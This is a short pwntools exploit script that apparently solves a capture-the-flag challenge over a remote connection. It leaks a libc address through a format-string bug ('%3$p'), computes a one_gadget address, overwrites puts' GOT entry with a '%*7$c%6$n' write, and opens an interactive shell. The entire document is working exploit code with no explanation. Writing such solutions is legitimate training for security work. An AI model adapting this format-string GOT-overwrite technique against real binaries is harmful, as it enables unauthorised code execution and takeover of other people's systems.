#!/usr/bin/env python3

from pwn import *

exe = ELF("./chall")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.35.so")

context.binary = exe

# p = process("./chall")
# gdb.attach(p, gdbscript="""
# b *0x0000000000401305
# """)

p = remote("10.212.138.23", 57173)

p.sendlineafter(b"choice: ", b"1")
p.sendlineafter(b"checked: ", b"AAAA")
p.sendlineafter(b"now?", b"%3$p")

leak = int(p.recvline().strip(), 16)
libc.address = leak - 0x1149d2
log.success(f"{hex(libc.address)=}")

one_gadget = libc.address + 0xebc85
end = one_gadget & 0xffffffff

if end > 0x10000000:
    print(hex(end))
    print("unlucky")
    exit()

puts_got = 0x404018

offset = one_gadget - libc.sym["puts"]

p.sendlineafter(b"choice: ", b"1")
p.sendlineafter(b"checked: ", p64(puts_got) + p64(end))
p.sendlineafter(b"now?", "%*7$c%6$n")

p.interactive()